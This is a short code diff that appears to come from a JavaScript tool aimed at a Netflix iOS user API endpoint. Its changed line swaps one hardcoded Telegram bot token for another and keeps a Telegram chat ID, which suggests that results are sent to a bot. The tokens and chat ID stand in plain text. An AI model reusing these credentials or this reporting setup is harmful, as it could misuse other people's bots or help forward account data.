@@ -14,7 +14,7 @@ const API_HOST = 'ios.prod.ftl.netflix.com';
 const API_PATH = '/iosui/user/15.48';
 
 // Telegram Config
-const TELEGRAM_BOT_TOKEN = '8368738660:AAFK_aq_1UKZIAB_4oeVxV-N79gXXvGpkn8';
+const TELEGRAM_BOT_TOKEN = '8663881958:AAHFko0QBufpnRMBUN7mRTxRYaS87r0eQrw';
 const TELEGRAM_CHAT_ID = '6326377463';
 
 const QUERY_PARAMS = {
